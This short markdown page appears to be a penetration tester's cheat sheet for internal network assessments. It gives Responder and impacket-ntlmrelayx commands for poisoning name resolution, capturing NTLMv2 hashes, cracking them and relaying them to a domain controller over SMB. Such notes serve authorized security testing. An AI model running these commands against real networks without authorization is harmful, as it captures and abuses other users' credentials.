---
layout: blank
pagetitle: Internal Assessments
---

## Poisoning
- Poisoning is often your best friend on internals
- Run `sudo responder -I {network_interface}` to capture auth information
  - Can try to crack NTLMv2 info or relay it onwards
- If the credentials can't be cracked, pair responder up with `ntlmrelayx`
  - `impacket-ntlmrelayx -t {protocol_like_smb}://{dc_ip} `